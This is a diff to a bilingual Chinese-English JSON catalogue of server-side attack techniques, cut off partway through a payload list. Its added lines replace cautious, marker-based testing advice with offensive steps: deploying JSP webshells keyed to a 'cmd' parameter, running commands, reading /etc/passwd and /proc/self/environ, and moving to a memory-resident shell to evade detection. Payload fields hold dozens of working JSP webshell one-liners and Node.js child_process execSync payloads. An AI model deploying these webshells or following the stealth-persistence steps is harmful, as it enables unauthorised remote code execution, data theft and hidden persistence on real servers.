-          "zh": "风险根因是可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束，使应用可能暴露“JSP request.getParameter 是否到达 Runtime、ProcessBuilder、脚本引擎或 ServletContext 资源读取，并如何返回输出”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when a writable JSP is compiled by the container, the application identity can create processes or read resources, and request values lack fixed command and path constraints, exposing the runtime boundary of whether JSP request.getParameter reaches Runtime, ProcessBuilder, script engines, or ServletContext resource reads and how output is returned. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束；三者使参数可进入 Java 进程 API 并继承容器权限。",
+          "en": "The risk root is writable JSPs compiled and executed by the container, the application identity allowed to create processes or read resources, and request parameters free of fixed command and path constraints; the three let parameters enter Java process APIs inheriting container privileges."
         },
         "exploitation": {
-          "zh": "在一次性 Servlet 容器按 Runtime、ProcessBuilder、输出读取、资源流和脚本引擎分组，使用固定 echo 与专用测试资源逐类验证。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "group tests by Runtime, ProcessBuilder, output readers, resource streams, and script engines in a disposable servlet container using fixed echo and dedicated test resources. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步把 <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%> 等样例部署到授权测试路径并触发容器编译，随后以 cmd=id 请求；命中判据为部署后请求 cmd 参数返回命令输出（带 IOUtils 回显的行直接返回 uid=，无回显行需外带或落盘取回）。逐条记录 JSP 编译类、容器访问日志与子进程审计；确认能力后以读取标记文件替代敏感命令。",
+          "en": "Per step 1, deploy <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%> and similar samples into authorized test paths, trigger container compilation, then request with cmd=id; a hit is command output per request after deployment (IOUtils-echo lines return uid= directly, non-echo lines need out-of-band or on-disk retrieval). Record compiled JSP classes, container access logs, and child-process audit per sample; once capability is confirmed, swap sensitive commands for marker-file reads."
         },
         "mitigation": {
-          "zh": "上传和模板目录禁用 JSP 编译，删除请求到进程 API 的映射，容器以最小权限运行并限制子进程、文件系统和脚本引擎。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "disable JSP compilation in upload and template storage, remove request-to-process mappings, and run the container with least privilege and restrictions on child processes, files, and script engines. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "上传和模板目录禁用 JSP 编译，删除请求到进程 API 的映射，容器以最小权限运行并限制子进程、文件系统和脚本引擎。修复后重放第 1 步部署与请求，确认 JSP 不再编译执行且正常业务可用。",
+          "en": "Disable JSP compilation in upload and template directories, remove request-to-process-API mappings, and run containers least-privileged with restricted child processes, filesystems, and script engines. After the fix, replay the step-1 deployment and requests, confirming JSPs no longer compile or execute while normal business works."
         },
         "difficulty": "expert"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“JSP Runtime 与 ProcessBuilder WebShell”执行入口",
-            "en": "Confirm the JSP Runtime and ProcessBuilder Webshells execution entry"
+            "zh": "获取 JSP 上传权限",
+            "en": "Gain JSP upload ability"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“可写 JSP 被容器编译执行，应用身份允许创建进程或读取资源，且请求参数未经过固定命令和路径约束”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that a writable JSP is compiled by the container, the application identity can create processes or read resources, and request values lack fixed command and path constraints, and record runtime version and service identity."
+            "zh": "找到可写且被容器编译执行的 Web 路径位置。命中判据：jsp 文件可访问且被成功执行，多次提交均能得到相同结果。",
+            "en": "Reach a writable path the container compiles and serves. Success: a jsp file executes on access."
           }
         },
         {
           "title": {
-            "zh": "建立“JSP/Servlet 进程执行”安全基线",
-            "en": "Establish the JSP and Servlet Process Execution baseline"
+            "zh": "部署 Runtime 木马",
+            "en": "Deploy the Runtime shell"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“JSP 编译类、容器访问日志、请求参数、固定 stdout 或测试资源标记以及子进程审计相对应”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the compiled JSP class, container access log, request value, fixed stdout or test-resource marker, and child-process audit correlate as abnormal evidence."
+            "zh": "写入 Runtime.exec 与 ProcessBuilder 形态的 cmd 参数木马。命中判据：cmd 参数返回输出。",
+            "en": "Drop Runtime.exec/ProcessBuilder shells keyed to a cmd param. Success: cmd returns output."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“JSP Runtime 与 ProcessBuilder WebShell”",
-            "en": "Validate JSP Runtime and ProcessBuilder Webshells line by line"
+            "zh": "读取命令输出流",
+            "en": "Read the command output stream"
           },
           "description": {
-            "zh": "测试步骤为：在一次性 Servlet 容器按 Runtime、ProcessBuilder、输出读取、资源流和脚本引擎分组，使用固定 echo 与专用测试资源逐类验证。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "group tests by Runtime, ProcessBuilder, output readers, resource streams, and script engines in a disposable servlet container using fixed echo and dedicated test resources. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>\n<%Runtime.getRuntime().exec(request.getParameter(new String(new byte[]{99,109,100})));%>\n<%Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));java.io.InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.print(new String(b,0,a));}%>\n<%Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\");out.print(s.hasNext()?s.next():\"\");%>\n<%Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",request.getParameter(\"cmd\")});%>\n<%Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",request.getParameter(\"cmd\")});%>\n<%Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",request.getParameter(\"cmd\")});%>\n<%Runtime.getRuntime().exec(new String[]{\"powershell\",\"-c\",request.getParameter(\"cmd\")});%>\n<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>\n<%=Runtime.getRuntime().exec(request.getParameter(new String(new byte[]{99,109,100})))%>\n<%Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>\n<%Process p=Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",request.getParameter(\"cmd\")});%>\n<%Process p=Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",request.getParameter(\"cmd\")});%>\n<%Process p=Runtime.getRuntime().exec(new String[]{\"powershell\",\"-c\",request.getParameter(\"cmd\")});%>\n<%java.lang.ProcessBuilder pb=new java.lang.ProcessBuilder(request.getParameter(\"cmd\").split(\" \"));pb.redirectErrorStream(true);Process p=pb.start();java.io.InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.print(new String(b,0,a));}%>\n<%java.lang.ProcessBuilder pb=new java.lang.ProcessBuilder(\"/bin/sh\",\"-c\",request.getParameter(\"cmd\"));pb.redirectErrorStream(true);Process p=pb.start();java.io.InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.print(new String(b,0,a));}%>\n<%java.lang.ProcessBuilder pb=new java.lang.ProcessBuilder(\"cmd.exe\",\"/c\",request.getParameter(\"cmd\"));pb.redirectErrorStream(true);Process p=pb.start();java.io.InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.print(new String(b,0,a));}%>\n<%java.lang.ProcessBuilder pb=new java.lang.ProcessBuilder(\"powershell\",\"-c\",request.getParameter(\"cmd\"));pb.redirectErrorStream(true);Process p=pb.start();java.io.InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.print(new String(b,0,a));}%>\n<%out.print(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%out.print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",request.getParameter(\"cmd\")}).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%out.print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",request.getParameter(\"cmd\")}).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%out.print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"powershell\",\"-c\",request.getParameter(\"cmd\")}).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%response.getWriter().print(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%response.getWriter().print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",request.getParameter(\"cmd\")}).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%response.getWriter().print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",request.getParameter(\"cmd\")}).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%response.getWriter().print(new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"powershell\",\"-c\",request.getParameter(\"cmd\")}).getInputStream()).useDelimiter(\"\\\\A\").next());%>\n<%pageContext.getServletContext().getResourceAsStream(\"/etc/passwd\");%>\n<%pageContext.getServletContext().getResourceAsStream(\"/flag\");%>\n<%pageContext.getServletContext().getResourceAsStream(\"/flag.txt\");%>\n<%pageContext.getServletContext().getResourceAsStream(\"WEB-INF/web.xml\");%>\n<%java.io.InputStream in=pageContext.getServletContext().getResourceAsStream(\"/etc/passwd\");byte[] b=new byte[in.available()];in.read(b);out.print(new String(b));%>\n<%java.io.InputStream in=pageContext.getServletContext().getResourceAsStream(\"/flag\");byte[] b=new byte[in.available()];in.read(b);out.print(new String(b));%>\n<%java.io.InputStream in=pageContext.getServletContext().getResourceAsStream(\"/flag.txt\");byte[] b=new byte[in.available()];in.read(b);out.print(new String(b));%>\n<%java.io.InputStream in=pageContext.getServletContext().getResourceAsStream(\"WEB-INF/web.xml\");byte[] b=new byte[in.available()];in.read(b);out.print(new String(b));%>\n<%out.print(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()));%>\n<%out.print(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",request.getParameter(\"cmd\")}).getInputStream()));%>\n<%out.print(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",request.getParameter(\"cmd\")}).getInputStream()));%>\n<%out.print(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(new String[]{\"powershell\",\"-c\",request.getParameter(\"cmd\")}).getInputStream()));%>\n<%out.print(javax.script.ScriptEngineManager.class.getMethod(\"getEngineByName\",String.class).invoke(new javax.script.ScriptEngineManager(),\"js\").eval(\"java.lang.Runtime.getRuntime().exec('\"+request.getParameter(\"cmd\")+\"')\"));%>"
+            "zh": "经参数执行命令并读取标准输出流回显到页面。命中判据：命令结果成功返回页面，并且该效果可以稳定重复取得。",
+            "en": "Execute commands and stream stdout back. Success: results appear on the page."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "内存马隐蔽驻留",
+            "en": "Go memory-resident for stealth"
           },
           "description": {
-            "zh": "实施“上传和模板目录禁用 JSP 编译，删除请求到进程 API 的映射，容器以最小权限运行并限制子进程、文件系统和脚本引擎”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying disable JSP compilation in upload and template storage, remove request-to-process mappings, and run the container with least privilege and restrictions on child processes, files, and script engines, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "转向内存马形态注册恶意路由，规避落盘检测。命中判据：无文件形态仍可持续控制目标，为下一步利用保留完整的输出内容。",
+            "en": "Shift to an in-memory shell registering rogue routes. Success: control persists without files."
           }
         }
       ],
@@ -3940,20 +3958,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "JSP 本地文件读取片段属于已获得服务器端代码执行上下文后的文件读取样例，验证目标为JSP 容器身份通过不同 Java 文件 API 能否读取请求者原本无法访问的本地或应用资源。成立前提为：攻击者已能执行或写入 JSP，容器身份具有目标文件读取权限，且代码没有固定资源映射。必须以专用无敏感测试文件中的唯一标记、容器文件审计和 JSP 响应能够对应作为证据，不能从路径字符串或异常消息推断文件内容已泄露。",
-          "en": "JSP Local File Read Snippets contains file-read samples used after server-side code execution, testing whether the JSP container identity can read local or application resources unavailable to the requester through several Java file APIs. It applies when the attacker can execute or write JSP, the container identity can read the target file, and code lacks a fixed resource mapping. Evidence requires a unique marker in a dedicated nonsensitive test file, container file auditing, and the JSP response correlate; path strings and error messages do not prove content disclosure."
+          "zh": "JSP 本地文件读取片段针对已获得服务器端代码执行上下文后的文件读取能力确认场景：验证 JSP 容器身份通过 Scanner、BufferedReader 与 FileInputStream 能读取的资源范围。",
+          "en": "JSP local file-read snippets target capability confirmation after server-side code execution is achieved: what resource scope the JSP container identity can read via Scanner, BufferedReader, and FileInputStream."
         },
         "vulnerability": {
-          "zh": "风险边界是攻击者已能执行或写入 JSP，容器身份具有目标文件读取权限，且代码没有固定资源映射，使运行时可能暴露“JSP 容器身份通过不同 Java 文件 API 能否读取请求者原本无法访问的本地或应用资源”。应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI；报告必须说明服务身份、规范路径、读取 API 和实际最小数据范围。",
-          "en": "The boundary exists when the attacker can execute or write JSP, the container identity can read the target file, and code lacks a fixed resource mapping, exposing whether the JSP container identity can read local or application resources unavailable to the requester through several Java file APIs. This is post-webshell or post-code-execution capability confirmation rather than standalone LFI, and reports must state service identity, canonical path, API, and minimal data scope."
+          "zh": "风险边界是攻击者已能执行或写入 JSP，容器身份具有目标文件读取权限，且代码没有固定资源映射；应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI。",
+          "en": "The risk boundary is attackers already able to execute or write JSP, the container identity holding read permission on targets, and code lacking fixed resource mapping; treat this as post-webshell capability confirmation, not standalone LFI."
         },
         "exploitation": {
-          "zh": "将所有系统与 flag 路径替换为容器挂载的只读测试文件，分别验证 Scanner、Reader 与 FileInputStream，记录目录目标导致的异常。所有系统、flag、配置和源码路径均替换为专用无敏感测试文件或目录；每轮只调用一个文件 API，并保存打开路径、权限结果、响应标记和清理记录。",
-          "en": "replace all system and flag paths with a read-only mounted test file, validate Scanner, Reader, and FileInputStream separately, and record exceptions from directory targets. Replace every system, flag, configuration, and source path with a dedicated nonsensitive test file or directory, invoke one file API per run, and preserve opened path, permission result, response marker, and cleanup record."
+          "zh": "按第 1 步把 Scanner/FileInputStream 读取片段部署到已确认可执行的 JSP 上下文，并把系统路径替换为预置无敏感测试文件（含唯一标记）；命中判据为片段执行后响应返回标记文件内容。逐条记录容器身份、规范路径与读取 API；WEB-INF 资源读取单独测试并记录，报告需说明服务身份与实际最小数据范围，不读取真实敏感文件。",
+          "en": "Per step 1, deploy the Scanner/FileInputStream snippets into the confirmed executable JSP context, replacing system paths with pre-seeded desensitized test files containing unique markers; a hit is marker-file content returned in the response after snippet execution. Record container identity, canonical paths, and read APIs per snippet; test WEB-INF resource reads separately with records—reports must state the service identity and minimal actual data scope, never reading real sensitive files."
         },
         "mitigation": {
-          "zh": "阻止上传 JSP 执行，容器身份仅访问业务目录，所有文件访问采用服务端对象 ID 与固定根目录，并对 WEB-INF 等资源拒绝动态路径。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认正常文件功能仍可用，同时对象映射与操作系统权限共同阻止越界读取。",
-          "en": "prevent uploaded JSP execution, restrict the container identity to business directories, use server-side object IDs with a fixed root for file access, and reject dynamic paths to WEB-INF and similar resources. Retest valid business objects, out-of-root paths, and symbolic-link boundaries under the same identity to preserve file features while object mapping and OS permissions block out-of-scope reads."
+          "zh": "阻止上传 JSP 执行，容器身份仅访问业务目录，所有文件访问采用服务端对象 ID 与固定根目录，并对 WEB-INF 等资源拒绝动态路径。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认对象映射与系统权限共同阻止越界读取。",
+          "en": "Block uploaded JSP execution, confine the container identity to business directories, route all file access through server-side object IDs with fixed roots, and reject dynamic paths for WEB-INF-style resources. After the fix, verify legitimate business objects, out-of-directory paths, and symlink boundaries under the same service account, confirming object mapping and OS permissions jointly prevent out-of-bounds reads."
         },
         "difficulty": "advanced"
       },
@@ -4060,20 +4078,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Python 本地文件读取表达式属于已获得服务器端代码执行上下文后的文件读取样例，验证目标为可控 Python 表达式是否以服务进程身份打开本地路径并把内容返回给请求者。成立前提为：应用存在 eval、模板、调试器或任务执行入口，服务身份可读目标路径，且没有文件对象映射与根目录限制。必须以预置测试文件的唯一标记、Python open 调用审计、工作进程和对应响应完整关联作为证据，不能从路径字符串或异常消息推断文件内容已泄露。",
-          "en": "Python Local File Read Expressions contains file-read samples used after server-side code execution, testing whether a controllable Python expression opens local paths under the service identity and returns content to the requester. It applies when the application exposes eval, templating, debugging, or task execution, the service identity can read the path, and no object mapping or root restriction exists. Evidence requires a planted test-file marker, Python open-call auditing, worker process, and response fully correlate; path strings and error messages do not prove content disclosure."
+          "zh": "Python 本地文件读取表达式针对已存在 eval、模板、调试器或任务执行入口时的文件读取能力确认场景：open().read() 以服务进程身份打开本地路径。验证四类路径表达式的读取返回。",
+          "en": "Python local file-read expressions target capability confirmation once eval, template, debugger, or task-execution entries exist: open().read() opens local paths under the service-process identity. It validates read returns across the four path-expression classes."
         },
         "vulnerability": {
-          "zh": "风险边界是应用存在 eval、模板、调试器或任务执行入口，服务身份可读目标路径，且没有文件对象映射与根目录限制，使运行时可能暴露“可控 Python 表达式是否以服务进程身份打开本地路径并把内容返回给请求者”。应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI；报告必须说明服务身份、规范路径、读取 API 和实际最小数据范围。",
-          "en": "The boundary exists when the application exposes eval, templating, debugging, or task execution, the service identity can read the path, and no object mapping or root restriction exists, exposing whether a controllable Python expression opens local paths under the service identity and returns content to the requester. This is post-webshell or post-code-execution capability confirmation rather than standalone LFI, and reports must state service identity, canonical path, API, and minimal data scope."
+          "zh": "风险边界是应用存在 eval、模板、调试器或任务执行入口，服务身份可读目标路径，且没有文件对象映射与根目录限制；应明确这是代码执行后的能力确认，而不是独立 LFI。",
+          "en": "The risk boundary is the application having eval, template, debugger, or task-execution entries with the service identity able to read targets and no file-object mapping or root restrictions; treat this as post-code-execution capability confirmation, not standalone LFI."
         },
         "exploitation": {
-          "zh": "先用字符串和算术确认表达式执行，再只读取挂载的无敏感测试文件；逐个 API 路径验证并禁止访问 .env、配置或 proc 数据。所有系统、flag、配置和源码路径均替换为专用无敏感测试文件或目录；每轮只调用一个文件 API，并保存打开路径、权限结果、响应标记和清理记录。",
-          "en": "confirm expression evaluation with strings and arithmetic, then read only a mounted nonsensitive test file, validating API paths without accessing env, configuration, or proc data. Replace every system, flag, configuration, and source path with a dedicated nonsensitive test file or directory, invoke one file API per run, and preserve opened path, permission result, response marker, and cleanup record."
+          "zh": "按第 1 步把 open('/etc/passwd').read() 等表达式的目标替换为预置唯一标记的测试文件后提交到已确认执行入口；命中判据为表达式求值返回标记文件内容。逐条记录服务身份、规范路径与调用审计；/proc/self/environ 用于确认进程环境可见性，返回内容需脱敏记录；报告说明这是执行后能力确认与最小数据范围。",
+          "en": "Per step 1, replace targets of open('/etc/passwd').read() and similar expressions with pre-seeded test files containing unique markers before submitting to the confirmed execution entry; a hit is expression evaluation returning marker-file content. Record service identity, canonical paths, and call audits per expression; /proc/self/environ confirms process-environment visibility with returned content masked in records; reports must state this is post-execution capability confirmation and the minimal data scope."
         },
         "mitigation": {
-          "zh": "移除动态 Python 求值，文件访问通过服务端对象 ID 和固定根目录，服务账户最小化文件权限并避免将秘密放入工作目录。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认正常文件功能仍可用，同时对象映射与操作系统权限共同阻止越界读取。",
-          "en": "remove dynamic Python evaluation, map file access through server-side object IDs and a fixed root, minimize service file permissions, and keep secrets out of the working directory. Retest valid business objects, out-of-root paths, and symbolic-link boundaries under the same identity to preserve file features while object mapping and OS permissions block out-of-scope reads."
+          "zh": "移除动态 Python 求值，文件访问通过服务端对象 ID 和固定根目录，服务账户最小化文件权限并避免将秘密放入工作目录。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认对象映射与系统权限共同阻止越界读取。",
+          "en": "Remove dynamic Python evaluation, route file access through server-side object IDs with fixed roots, minimize service-account file permissions, and keep secrets out of working directories. After the fix, verify legitimate business objects, out-of-directory paths, and symlink boundaries under the same service account, confirming object mapping and OS permissions jointly prevent out-of-bounds reads."
         },
         "difficulty": "advanced"
       },
@@ -4180,63 +4198,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Node.js 子进程与文件读取表达式用于核对不可信表达式是否能解析 require、process 或 Function 构造器，并到达 child_process 或 fs API。该条目只在以下前提下适用：应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力。有效判定必须取得实际表达式入口、Node 版本、调用栈、固定子进程或测试文件标记和工作进程日志能够对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Node.js Child-Process and File-Read Expressions checks whether an untrusted expression resolves require, process, or the Function constructor and reaches child_process or fs APIs. It applies when the application evaluates user data as JavaScript, a template expression, or a deserialized function without isolating require, process, and filesystem capabilities. A valid finding requires the expression entry, Node version, call stack, fixed child-process or test-file marker, and worker log correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Node.js 子进程与文件读取表达式针对应用将用户值作为 JavaScript 执行且未隔离 require、process 能力的场景：execSync 与 fs.readFileSync 是主要验证面。验证表达式到达 child_process 或 fs 的完整链路。",
+          "en": "Node.js child-process and file-read expressions target applications executing user values as JavaScript without isolating require/process capabilities: execSync and fs.readFileSync are the main validation surfaces. It validates the full chain of expressions reaching child_process or fs."
         },
         "vulnerability": {
-          "zh": "风险根因是应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力，使应用可能暴露“不可信表达式是否能解析 require、process 或 Function 构造器，并到达 child_process 或 fs API”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when the application evaluates user data as JavaScript, a template expression, or a deserialized function without isolating require, process, and filesystem capabilities, exposing the runtime boundary of whether an untrusted expression resolves require, process, or the Function constructor and reaches child_process or fs APIs. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力；表达式因此可解析模块引用并到达进程或文件 API。",
+          "en": "The risk root is applications executing user values as JavaScript, template expressions, or deserialization functions while the runtime leaves require, process, and filesystem capabilities unisolated; expressions can thus resolve module references and reach process or file APIs."
         },
         "exploitation": {
-          "zh": "先用算术与对象属性确认表达式执行，再分别用固定 echo 和专用测试文件验证 child_process 与 fs，标记已移除的 mainModule 路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "confirm expression evaluation with arithmetic and object properties, then test child_process and fs separately with fixed echo and a dedicated test file while tagging removed mainModule paths. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步把 require('child_process').execSync('id').toString() 等表达式提交到已确认的执行入口（模板、eval、函数反序列化）；命中判据为表达式执行返回命令输出。确认可达后测试 fs.readFileSync 对预置标记文件的读取，并记录实际入口、Node 版本、调用栈与 worker 日志；代码片段存在或请求 200 不构成命中，必须以执行输出佐证。",
+          "en": "Per step 1, submit require('child_process').execSync('id').toString() and similar expressions to the confirmed execution entry (template, eval, function deserialization); a hit is expressions executing and returning command output. After confirming reachability, test fs.readFileSync against pre-seeded marker files, recording the actual entry, Node version, call stack, and worker logs; snippet existence or a 200 response is not a hit—execution output must corroborate."
         },
         "mitigation": {
-          "zh": "不执行用户 JavaScript 或函数字符串，采用数据 schema 与固定操作，隔离 worker 能力并限制 child_process、fs 与 process 暴露。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "do not evaluate user JavaScript or function strings, use data schemas and fixed operations, isolate worker capabilities, and restrict child_process, fs, and process exposure. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "不执行用户 JavaScript 或函数字符串，采用数据 schema 与固定操作，隔离 worker 能力并限制 child_process、fs 与 process 暴露。修复后重放第 1 步表达式，确认模块引用不可解析且正常业务功能保留。",
+          "en": "Never execute user JavaScript or function strings; adopt data schemas with fixed operations, isolate worker capabilities, and restrict child_process, fs, and process exposure. After the fix, replay the step-1 expressions and confirm module references cannot resolve while legitimate features persist."
         },
         "difficulty": "expert"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Node.js 子进程与文件读取表达式”执行入口",
-            "en": "Confirm the Node.js Child-Process and File-Read Expressions execution entry"
+            "zh": "定位表达式执行入口",
+            "en": "Find an expression sink"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that the application evaluates user data as JavaScript, a template expression, or a deserialized function without isolating require, process, and filesystem capabilities, and record runtime version and service identity."
+            "zh": "找到把输入作为 JavaScript 执行的模板、接口或反序列化点。命中判据：表达式结果反映到响应输出。",
+            "en": "Find a template/API/deserializer running input as JavaScript. Success: expression results surface."
           }
         },
         {
           "title": {
-            "zh": "建立“Node.js 运行时能力访问”安全基线",
-            "en": "Establish the Node.js Runtime Capability Access baseline"
+            "zh": "注入子进程执行片段",
+            "en": "Inject the child_process snippet"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“实际表达式入口、Node 版本、调用栈、固定子进程或测试文件标记和工作进程日志能够对应”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the expression entry, Node version, call stack, fixed child-process or test-file marker, and worker log correlate as abnormal evidence."
+            "zh": "提交 execSync 执行命令并把结果回显的片段。命中判据：返回命令执行的输出内容，同时排除缓存或随机因素干扰。",
+            "en": "Submit execSync snippets returning command output. Success: output is returned."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“Node.js 子进程与文件读取表达式”",
-            "en": "Validate Node.js Child-Process and File-Read Expressions line by line"
+            "zh": "读取文件内容回显",
+            "en": "Read files back"
           },
           "description": {
-            "zh": "测试步骤为：先用算术与对象属性确认表达式执行，再分别用固定 echo 和专用测试文件验证 child_process 与 fs，标记已移除的 mainModule 路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "confirm expression evaluation with arithmetic and object properties, then test child_process and fs separately with fixed echo and a dedicated test file while tagging removed mainModule paths. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "require('child_process').execSync('id').toString()\nrequire('child_process').execSync('whoami').toString()\nrequire('child_process').execSync('cat /flag').toString()\nrequire('child_process').execSync('ls /').toString()\nrequire('child_process').exec('id')\nrequire('child_process').exec('whoami')\nrequire('child_process').exec('cat /flag')\nrequire('child_process').exec('ls /')\nrequire('child_process').spawn('id')\nrequire('child_process').spawn('whoami')\nrequire('child_process').spawn('cat /flag')\nrequire('child_process').spawn('ls /')\nglobal.process.mainModule.require('child_process').execSync('id').toString()\nglobal.process.mainModule.require('child_process').execSync('whoami').toString()\nglobal.process.mainModule.require('child_process').execSync('cat /flag').toString()\nglobal.process.mainModule.require('child_process').execSync('ls /').toString()\nthis.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()\nthis.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()\nthis.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString()\nthis.constructor.constructor('return process')().mainModule.require('child_process').execSync('ls 